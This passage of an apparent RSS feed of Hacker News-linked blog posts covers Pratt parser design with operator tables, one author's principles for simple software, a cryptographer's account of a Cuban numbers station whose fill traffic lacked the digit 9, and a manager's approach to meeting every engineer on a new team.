  <li>encodes the affix (by specifying its superclass)</li>
  <li>encodes the associativity  (by specifying its superclass)</li>
  <li>records the precedence</li>
  <li>provides a home for <code>MultiplyMethodA</code> and <code>MultiplyMethodB</code></li>
</ol>

<p>But why are we using different classes at all? This OOP design has several flaws:</p>

<ul>
  <li>It violates the principle of separation of concerns: Why are AST nodes doing the work of the parser?</li>
  <li>It violates the DRY Principle: Unless you autogenerate the code, you need to write a class for every operator‚Äîeven if you relegate the parslet code to a handful of superclasses.</li>
  <li>This parser design is littered with static data: operator tokens, constants for precedence, associativity, affix, and token IDs, all of which is redundant, as it exists in a table used by the driver algorithm anyway. (Ironically, it is precisely because of its object-oriented design that the code and the data it acts upon are so disparate. This is not entirely the fault of OOP per se but rather of a poor choice of what concepts should be materialized as objects.)</li>
  <li>Generalizing the previous point: This design fixes the language at compile time. If you want to change the precedence of an operator, you need to rewrite, recompile, and redeploy the parser.</li>
  <li>It is cumbersome to write an operator table statically: Unless the code is automatically generated, writing ‚Äú<code>parser.registeroperator(op, prec, assoc, whatever)</code>,‚Äù the code that line depends on, and every subclass for every single operator is a bummer. Even if you autogenerate code, you have to write a code generator.</li>
</ul>

<p>‚ùùThe temptation to write a code generator is often a sign that a more flexible design exists, a design that exploits whatever regularity exists in the code that makes programmatically generating the code possible in the first place.‚ùû</p>

<p>The temptation to write a code generator is often a sign that a more flexible design exists, a design that exploits whatever regularity exists in the code that makes programmatically generating the code possible in the first place. <em>In principle</em>, if code can automatically be generated, it can also be automatically compiled and executed. So maybe the (hypothetical) generate-compile-run pipeline (usually called a JIT or jitter) can be refactored to eliminate the compile step. In our case, instead of writing a bespoke Pratt parser in which the operator table is both encoded in the class hierarchy and generated again at runtime, why not write a generic Pratt parser that reads in the operator database at startup? As a bonus, modifying the language does not require a recompile: You can add, remove, or modify operators at <em>runtime</em> if you‚Äôd like, and maintaining the expression grammar is as simple as editing a value in a spreadsheet. (Indeed, it could be literally that!)</p>

<h3 id="operator-database">Operator Database</h3>

<p>As a toy example, we might have an operator database as follows.</p>

<table>
  <thead>
    <tr>
      <th>TokenID</th>
      <th>Operator</th>
      <th>NameString</th>
      <th>Precedence</th>
      <th>Associativity</th>
      <th>Affix</th>
      <th>Arity</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td><code>"123"</code></td>
      <td><code>"Number"</code></td>
      <td>0</td>
      <td>None</td>
      <td>Null</td>
      <td>Nullary</td>
    </tr>
    <tr>
      <td>2</td>
      <td><code>"^"</code></td>
      <td><code>"Power"</code></td>
      <td>10</td>
      <td>Right</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>3</td>
      <td><code>"*"</code></td>
      <td><code>"Times"</code></td>
      <td>20</td>
      <td>Full</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>4</td>
      <td><code>"/"</code></td>
      <td><code>"Divide"</code></td>
      <td>20</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>5</td>
      <td><code>"+"</code></td>
      <td><code>"Plus"</code></td>
      <td>30</td>
      <td>Full</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>6</td>
      <td><code>"-"</code></td>
      <td><code>"Minus"</code></td>
      <td>30</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
  </tbody>
</table>

<p>The <code>TokenID</code> might be supplied by the lexer/scanner (many Pratt parsers are scanner-less) and will be used as the identifier. <code>Operator</code> and <code>NameString</code> are only used for printing output. The remaining columns are required to compute the left and right binding powers of each operator. In this example language, every operator is either a terminal (number) or a binary infix operator.</p>

<h3 id="more-sophisticated-operators">More Sophisticated Operators</h3>

<p>Suppose we have ternary, mixfix, or matchfix operators. Then we need to modify the operator database to reflect how the operator tokens appear in an expression. A portion of our operator table might now look like this.</p>

<table>
  <thead>
    <tr>
      <th>TokenID</th>
      <th>LToken</th>
      <th>NToken</th>
      <th>OToken</th>
      <th>NameString</th>
      <th>Precedence</th>
      <th>Associativity</th>
      <th>Affix</th>
      <th>Arity</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>10</td>
      <td><code>"("</code></td>
      <td>&nbsp;</td>
      <td><code>")"</code></td>
      <td><code>"Parentheses"</code></td>
      <td>10</td>
      <td>Non</td>
      <td>Matchfix</td>
      <td>Unary</td>
    </tr>
    <tr>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
    </tr>
    <tr>
      <td>43</td>
      <td><code>"["</code></td>
      <td>&nbsp;</td>
      <td><code>"]"</code></td>
      <td><code>"Index"</code></td>
      <td>30</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>44</td>
      <td>&nbsp;</td>
      <td><code>"!"</code></td>
      <td>&nbsp;</td>
      <td><code>"Factorial"</code></td>
      <td>40</td>
      <td>Left</td>
      <td>Postfix</td>
      <td>Unary</td>
    </tr>
    <tr>
      <td>46</td>
      <td>&nbsp;</td>
      <td><code>"-"</code></td>
      <td>&nbsp;</td>
      <td><code>"UnaryMinus"</code></td>
      <td>50</td>
      <td>Right</td>
      <td>Prefix</td>
      <td>Unary</td>
    </tr>
    <tr>
      <td>49</td>
      <td><code>"/"</code></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>"Divide"</code></td>
      <td>60</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>55</td>
      <td><code>"?"</code></td>
      <td>&nbsp;</td>
      <td><code>":"</code></td>
      <td><code>"IfThenElse"</code></td>
      <td>70</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Ternary</td>
    </tr>
    <tr>
      <td>57</td>
      <td><code>"+"</code></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>"Plus"</code></td>
      <td>80</td>
      <td>Full</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>60</td>
      <td><code>"-"</code></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>"Minus"</code></td>
      <td>90</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
  </tbody>
</table>

<p>In this design, the database includes which tokens of the operator can take a left operand (<code>LToken</code>), can begin an expression (no left operand, <code>NToken</code>), or are included in some other position (<code>OToken</code>).</p>

<blockquote>
  <p>The <code>LToken</code>, <code>NToken</code>, <code>OToken</code>, <code>Affix</code>, and <code>Arity</code> can all be inferred from a single example usage, for example:
<code>op1 ? op2 : op3</code>
This suggests that there may be a way to generate a parser for an expression language using nothing but examples. Indeed, there is!</p>
</blockquote>

<p>To reiterate the point, this table of operators might live in a plaintext CSV file. At startup‚Äînot at compile time‚Äîthe Pratt parser reads in the operator table. AST nodes know their identity by their <code>TokenID</code> (which is really an operator ID) or string representation and perform identity-specific actions via dynamic dispatch.</p>

<h3 id="dynamic-dispatch">Dynamic Dispatch</h3>

<p>That last sentence should have raised your suspicion. A fundamental benefit of this design, I claim, is that it keeps you from having to write boilerplate for every operator. Are we just shifting the boilerplate from the ‚Ä¶</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.robertjacobson.dev/designing-a-pratt-parser-generator">https://www.robertjacobson.dev/designing-a-pratt-parser-generator</a></em></p>]]>
            </description>
            <link>https://www.robertjacobson.dev/designing-a-pratt-parser-generator</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513092</guid>
            <pubDate>Fri, 18 Sep 2020 04:46:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Principles for Building Software]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512801">thread link</a>) | @dailymorn
<br/>
September 17, 2020 | http://kevinmahoney.co.uk/articles/my-principles-for-building-software/ | <a href="https://web.archive.org/web/*/http://kevinmahoney.co.uk/articles/my-principles-for-building-software/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting" id="my-principles-for-building-software">
  <div itemprop="articleBody">
    <p><time itemprop="datePublished">17 September 2020</time></p>

<p>These are my personal principles for building software. I hope to frequently update them as my views change. There can be
valid reasons for breaking them (they are <em>principles</em>, not <em>laws</em>), but in general I believe following
them works out well.</p>

<p>Most of them revolve around making the system simpler in some way. It‚Äôs
my belief that simpler systems are more reliable, easier and quicker to modify,
and generally easier to work with.</p>

<ul>
  <li><a href="#make-invalid-states-unrepresentable">Make Invalid States Unrepresentable</a></li>
  <li><a href="#data-consistency-makes-systems-simpler">Data Consistency Makes Systems Simpler</a></li>
  <li><a href="#design-data-first">Design ‚ÄúData First‚Äù</a></li>
  <li><a href="#measure-before-you-cut">Measure Before You Cut</a></li>
  <li><a href="#avoid-trading-local-simplicity-for-global-complexity">Avoid Trading Local Simplicity for Global Complexity</a></li>
  <li><a href="#recognise-intrinsic-complexity">Recognise Intrinsic Complexity</a></li>
  <li><a href="#fewer-technologies-result-in-simpler-systems">Fewer Technologies Result in Simpler Systems</a></li>
  <li><a href="#focus-your-learning-on-concepts-not-technologies">Focus Your Learning on Concepts, not Technologies</a></li>
  <li><a href="#code-consistency-is-important">Code Consistency is Important</a></li>
  <li><a href="#shared-principles-are-important">Shared Principles are Important</a></li>
</ul>

<h2 id="make-invalid-states-unrepresentable">Make Invalid States Unrepresentable</h2>

<p>I have put this first because I think it is one of the most important
and most powerful principles.</p>

<p>You may have heard this phrase in relation to designing your program‚Äôs types, but
the principle applies everywhere you represent data - for example database design.</p>

<p>Not only does this reduce the number of states
your system can be in (and thus make it simpler), but it reduces the
number of <em>invalid</em> states, which is even better! Your system does not
have to handle these states because they literally cannot be
represented in your program.</p>

<p>This is not just a minor convenience, it can drastically simplify your system and prevent
entire classes of bugs from occurring.</p>

<h2 id="data-consistency-makes-systems-simpler">Data Consistency Makes Systems Simpler</h2>

<p>Consistency enforces rules on your data, and so reduces the number
of states your system needs to handle. This follows on from the
‚Äúmake invalid states unrepresentable‚Äù principle.</p>

<p>I am using consistency here in a very general sense: that your data
adheres to certain rules, and that it always obeys those rules
at every point in time. This definition is related to ACID consistency, and shouldn‚Äôt be confused with CAP consistency.</p>

<p>The rules can be any pretty much anything, for example, 
that your credit should never be able to go negative,
or that private posts should not be visible to others.
It is not restricted to foreign keys or unique indexes, although
they are also valid examples.</p>

<p>As well as your database, consistency may be enforced by your
application utilising ACID transactions. It is preferable to enforce
them at the database level, but this is not common practice for
anything more complex than simple checks for practical reasons.</p>

<p>Anything which restricts or compromises consistency results in complexity.
This leads to the following practical advice:</p>

<p>It is simpler to have:</p>
<ul>
  <li>Fewer databases (ideally one)</li>
  <li>Normalised, less redundant data</li>
  <li>A ‚Äògood‚Äô database design (big topic)</li>
  <li>ACID transactions</li>
  <li>More data constraints</li>
</ul>

<p>It is more complex to have:</p>
<ul>
  <li>Multiple databases</li>
  <li>Redundant or denormalised data</li>
  <li>A poor database design</li>
  <li>Fewer (or no) data constraints</li>
</ul>

<p>Of course, there are valid reasons to make your system more complex, and I don‚Äôt
intend complexity to be a dirty word, but see <a href="#measure-before-you-cut">‚Äúmeasure before you cut‚Äù</a>.</p>

<p>I consider this principle to be one of the most undervalued in
software engineering today. Consistency issues often go unrecognised.
Many problems, I daresay <em>most</em> problems,
are consistency issues at an essential level - data that does
not conform to some expectation.</p>

<p>See <a href="#appendix-a-inconsistency-results-in-complexity">the appendix</a> for an illustration of how inconsistency can cause complexity.</p>

<h2 id="design-data-first">Design ‚ÄúData First‚Äù</h2>

<p>What is more likely to be around in 10 years: your code or your data?</p>

<p>Code can be thrown away and re-written, but this is rarely the case
with data.</p>

<p>Data is more important than code. The only purpose of code is to transform data.</p>

<p>When designing a new system, it‚Äôs best to start with your database and
your data structures and build your code on top of that. Consider
the constraints you can place on your data and enforce them, ideally
by the way your represent your data.</p>

<p>Code design flows naturally from data design. The simpler and more
consistent your data model is, the simpler your code will be.</p>

<blockquote>
<p>Show me your flowcharts and conceal your tables,
and I shall continue to be mystified. Show me your tables,
and I won‚Äôt usually need your flowcharts; they‚Äôll be obvious</p>

</blockquote>

<blockquote>
<p>Bad programmers worry about the code. Good programmers worry about data structures and their relationships.</p>

</blockquote>

<h2 id="measure-before-you-cut">Measure Before You Cut</h2>

<p>This is the most common mistake made by software developers.
It‚Äôs responsible for <em>many</em> self-inflicted problems.</p>

<p>The principle is that when you make a trade-off that has a complexity cost, ensure that
the need for the trade-off is backed by emprical evidence.</p>

<p>Common mistakes:</p>

<ul>
  <li>Trying to build a complex ‚Äúscalable‚Äù system that scales to
a size you‚Äôll never need.</li>
  <li>Making services as small as possible without considering
need or cost.</li>
  <li>Adding inconsistency or complexity for performance in a part
of the system that is not a performance bottleneck.</li>
</ul>

<p>Advice:</p>

<ul>
  <li>Start with the simplest, most correct system possible.</li>
  <li>Measure performance.</li>
  <li>Do not pay complexity costs or violate the other principles
until it solves an actual problem, not an imaginary one.</li>
  <li>Some optimisations can be made without measurement, because
they have very little or zero cost. For example, using the
correct data structures that support favourable performance
for the operations you want to perform.</li>
  <li>It‚Äôs true that sometimes experience alone can tell you if you‚Äôre making the
correct trade-off. It‚Äôs still better if you can prove it.</li>
  <li>When you have to choose, prefer correctness and simplicity over performance.</li>
  <li>In some cases correct and simple code is the best performing code!</li>
</ul>

<blockquote>
<p>The real problem is that programmers have spent far too much time
worrying about efficiency in the wrong places and at the wrong times;
premature optimization is the root of all evil (or at least most of
it) in programming.</p>

</blockquote>

<h2 id="avoid-trading-local-simplicity-for-global-complexity">Avoid Trading Local Simplicity for Global Complexity</h2>

<p>i.e. avoid making a part of the system simpler in exchange for making
the system as a whole more complex.</p>

<p>This trade is usually not an even one. Chasing after local simplicity can
cause and order of magnitude increase in global complexity.</p>

<p>For example, smaller services can make those services simpler,
but the reduction in consistency and the need for more inter-process
communication makes the system much more complicated.</p>

<h2 id="recognise-intrinsic-complexity">Recognise Intrinsic Complexity</h2>

<p>Sometimes things are just complicated. You cannot make problems simpler than they are.</p>

<p>Any attempt to do so will ironically make your system more complex.</p>

<h2 id="fewer-technologies-result-in-simpler-systems">Fewer Technologies Result in Simpler Systems</h2>

<p>It is better to understand a few technologies deeply than many
technologies at a surface level. Fewer technologies mean fewer
things to learn, and less operational complexity.</p>

<h2 id="focus-your-learning-on-concepts-not-technologies">Focus Your Learning on Concepts, not Technologies</h2>

<p>Do not concern yourself too much with intricate details of the software you use - you
can always look them up. Learn the underlying fundamental concepts.</p>

<p>Technologies change, concepts are eternal. The concepts you learn will
be used in newer technologies, and you will be able to learn them much quicker.</p>

<p>For example, do not concern yourself so much with the surface level
details of React, Kubernetes, Haskell, Rust, etc.</p>

<p>Focus on learning:</p>
<ul>
  <li>Pure functional programming</li>
  <li>The relational model</li>
  <li>Formal methods</li>
  <li>Logic programming</li>
  <li>Algebraic data types</li>
  <li>Typeclasses (in general and specific ones)</li>
  <li>The borrow checker (affine/linear types)</li>
  <li>Dependant Types</li>
  <li>The Curry-Howard Isomorphism</li>
  <li>Macros</li>
  <li>Homoiconicity</li>
  <li>VirtualDOM</li>
  <li>Linear regression</li>
  <li>etc.</li>
</ul>

<h2 id="code-consistency-is-important">Code Consistency is Important</h2>

<p>This is important for keeping the barrier to entry for understanding your code low.</p>

<p>Sometimes writing the consistent thing is more important than writing
the ‚Äúcorrect‚Äù thing. If you want to change the way something works in
your codebase, change all instances of it.  Otherwise, try to stick
with it.</p>



<p>The more principles you have in common with your teammates, the better
you will work together, and the more you will enjoy working together.</p>

<h2 id="appendix-a-inconsistency-results-in-complexity">Appendix A: Inconsistency Results in Complexity</h2>

<p>This is the simplest example I can think of to illustrate this principle.
I hope it doesn‚Äôt require too much imagination to relate to realistic
problems.</p>

<p>Consider a database with two Boolean variables <code>x</code> and <code>y</code>. Your
application has a rule that <code>x = y</code>, and it can enforce this rule by
using a transaction to atomically change both variables.</p>

<p>If this rule is correctly enforced, your data can only be
in two states: <code>(x = True, y = True)</code> or <code>(x = False, y = False)</code>.</p>

<p>Writing the function ‚Äòtoggle‚Äô with this rule in place is
straightforward. You atomically read one of the values and set both
values to the negation.</p>

<p>Now consider what happens if you split those variables into their own
databases and they can no longer be atomically changed together.</p>

<p>Because you can no longer consistently ensure that <code>x = y</code>, your data
can be in two more states: <code>(x = True, y = False)</code> or <code>(x = False, y = True)</code>.</p>

<ul>
  <li>Which value should you use if your system is in one of these states?</li>
  <li>What should your ‚Äòtoggle‚Äô function do in one of these states?</li>
  <li>How do you ensure that both writes are successful when writing a new value?</li>
</ul>

<p>There are no correct answers to these questions.</p>

<p>Of course, if we‚Äôd followed the <a href="#make-invalid-states-unrepresentable">‚Äúmake invalid states unrepresentable‚Äù</a> principle
in the first place, there would only be one variable! :)</p>

  </div>
</article></div>]]>
            </description>
            <link>http://kevinmahoney.co.uk/articles/my-principles-for-building-software/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512801</guid>
            <pubDate>Fri, 18 Sep 2020 03:50:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Cryptologic Mystery]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24512546">thread link</a>) | @wglb
<br/>
September 17, 2020 | https://www.mattblaze.org/blog/neinnines/ | <a href="https://web.archive.org/web/*/https://www.mattblaze.org/blog/neinnines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="center"><div>
		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenƒáion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mattblaze.org/blog/neinnines/">https://www.mattblaze.org/blog/neinnines/</a></em></p>]]>
            </description>
            <link>https://www.mattblaze.org/blog/neinnines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512546</guid>
            <pubDate>Fri, 18 Sep 2020 03:03:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Meeting Everyone on a New Team]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512527">thread link</a>) | @craigkerstiens
<br/>
September 17, 2020 | https://www.annashipman.co.uk/jfdi/meeting-everyone.html | <a href="https://web.archive.org/web/*/https://www.annashipman.co.uk/jfdi/meeting-everyone.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="meeting-everyone">
    
    <date>17 September 2020</date>
      <p>When I joined the Financial Times as Technical Director for FT.com, I inherited a team of around 50 engineers. One of the first things I did was meet each of them for a one-to-one. I was initially resistant, but it was extremely valuable, I‚Äôm glad I did it, and I would definitely do it again in a future role.</p>

<h2 id="my-mentors-advice-about-the-content-of-the-meeting">My mentor‚Äôs advice about the content of the meeting</h2>

<p>The idea was suggested to me by a mentor, who‚Äôd been advised to do it by <em>his</em> mentor, a Rear Admiral, who said this was something you should do whenever you have a team of fewer than 150 people. My mentor gave me some tips:</p>

<ul>
  <li>Be clear about whether you will take action or whether this is for information only.</li>
  <li>This should mostly be about listening ‚Äì you should talk for maybe 5 minutes and they should talk for 25.</li>
  <li>It‚Äôs to find out what‚Äôs going well and what‚Äôs not going well.</li>
  <li>It‚Äôs informal, but make sure it‚Äôs in an enclosed meeting room so that people feel they can speak freely.</li>
  <li>Sometimes it will be quite boring, sometimes you may just learn a lot about someone‚Äôs family or hobbies, but that is useful from a getting to know people/relationship-building perspective and it means that you know some things about that person.</li>
  <li>Aim is to get a bit about their background, their priorities and their pressures.</li>
</ul>

<h2 id="making-time-was-hard">Making time was hard</h2>

<p>I was initially resistant because of the time commmitment. With a team of ~50, that‚Äôs a lot of hours, and I was also working four days a week so each meeting takes up a greater proportion of time. However, once I‚Äôd made the decision to do this and announced my intention, it was important to me to follow through, so I made sure to make time.</p>

<p>I scheduled four of these 1:1s a week, starting with the people reporting directly to me and then on down the management chain.</p>

<h2 id="i-ran-each-meeting-in-the-same-way">I ran each meeting in the same way</h2>

<p>Firstly I ran through everything I planned to cover, and then stepped through it.</p>


<ul>
  <li>I am asking the same questions to everyone</li>
  <li>This is information for me only to get an idea of themes and how things are going; I‚Äôm not explicitly planning to take action on anything we discuss, so if something comes up that I need to take action on, let‚Äôs make sure we discuss that after this meeting</li>
  <li>This is confidential. If you say something about someone else I‚Äôm not going to go and tell them. I may report on ‚Äòwhat people are saying‚Äô, but I‚Äôll say ‚Äòthe engineers feel‚Äô or ‚Äòan engineer said‚Äô; I won‚Äôt say ‚Äú[Your name] said‚Ä¶‚Äù</li>
</ul>

<h3 id="what-were-going-to-discuss">What we‚Äôre going to discuss</h3>

<ul>
  <li>First I‚Äôll introduce myself, and tell you a bit about my background</li>
  <li>Then, if you like, I‚Äôd love you to tell me a bit about yourself ‚Äì as much or as little as you feel like sharing</li>
  <li>Then we‚Äôll discuss the following questions:</li>
</ul>

<ol>
  <li>What do you think the most important things we should be doing over the next year?</li>
  <li>What will get in the way of us doing that?</li>
  <li>What‚Äôs going well, i.e. what should we make sure we don‚Äôt change?</li>
  <li>Is there anything you think I should know about?</li>
</ol>

<h2 id="is-there-anything-i-should-know-about">Is there anything I should know about?</h2>

<p>When I asked this question I talked a bit about why I was asking. I explained that I might not necessarily see or know things that may seem apparent to them, and while they should always feel able to bring things to me, now was a good opportunity to do so. It was an opportunity to make sure I‚Äôve heard what‚Äôs important to you, what things should change and what things should stay the same.</p>

<p>This question always elicited very interesting responses, from organisational issues, to personal information people felt it was valuable for me to know about them.</p>

<h2 id="i-told-them-what-i-was-planning-to-ask-in-advance">I told them what I was planning to ask in advance</h2>

<p>I put all the information in the meeting invite.</p>

<div>
<p>I mentioned that I wanted to have a chat with everyone on FT.com to understand how things are going, does this time suit you for this?</p>

<p>The meeting agenda is the same for everyone; a quick intro and then the following questions (I'll go through this in the meeting too):</p>

<ul>
<li>What do you think the most important things we should be doing over the next year?</li>
<li>What will get in the way of us doing that?</li>
<li>What‚Äôs going well, i.e. what should we make sure we don‚Äôt change?</li>
<li>Is there anything you think I should know about?</li>
</ul>

<p>Thanks,</p>
<p>Anna</p>
</div>

<p>Some people did not read the meeting invite and came with no idea what the meeting was about. Some people had fully prepared and written notes that they then read out to me. Actually people having prepared sometimes was less useful, because sometimes it led the conversation to solutions rather than problems. However it was great that people had really given it some thought.</p>

<h2 id="making-notes-felt-too-much-like-a-promise">Making notes felt too much like a promise</h2>

<p>Each meeting was half an hour. In the very first one, I made notes in a notebook, but I realised that created an implicit commitment that I was going to take action on everything that was said, even though I had said it was information only.</p>

